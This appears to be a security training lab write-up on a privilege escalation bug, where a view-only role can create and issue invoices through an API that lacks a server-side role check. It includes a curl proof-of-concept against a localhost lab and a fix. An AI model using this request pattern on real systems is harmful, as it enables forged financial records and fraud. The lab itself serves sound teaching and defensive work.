# Lab 05 — Viewer Privilege Escalation (Create & Issue Invoices)

**Mirrors:** Report 6 — *Viewer role can create and issue sales invoices despite having view-only permissions*
**Class:** Privilege escalation / missing function-level authorization · **Severity:** High

## The story

The **Viewer** role is documented as read-only for invoices. The UI honors that —
it hides the "Create invoice" button. But the create endpoint performs **no
server-side role check**, so a Viewer can create and *issue* a real financial
record.

## Recon first (BundleBleed)

Same path used for both list and create — mined from the bundle:

```
POST /api-internal/v2/sales-invoices?organizationId=<ORG>
```

## Reproduce

1. Log in as `viewer@acme.test`. Open the **Invoices** tab — no "Create" button
   (view-only). The lab shows a notice pointing you at the API.
2. Grab your `csrfToken` (from `/api-internal/auth/me`).
3. Create an invoice directly:

```bash
curl -X POST 'http://localhost:4000/api-internal/v2/sales-invoices?organizationId=org_ACME0001' \
  -H "Cookie: SESSIONID=<your-session>" \
  -H "X-Csrf-Token: <your-csrf-token>" \
  -H "Content-Type: application/json" \
  -d '{"customerName":"Ghost Buyer","amount":9999}'
```

4. **Result:** `{"ok":true,"invoice":{...,"status":"issued","createdBy":"viewer"}}`.
   Log in as `owner@acme.test` and see the same invoice — a state-changing
   action a viewer should never be able to perform.

## Why it matters

Hiding a button is not authorization. A read-only role that can mint financial
records means fraud, tampered books, and audit/compliance failures.

## The fix

Gate the function server-side:

```js
if (!["owner", "finance"].includes(req.user.role))
  return res.status(403).json({ error: "forbidden" });
```
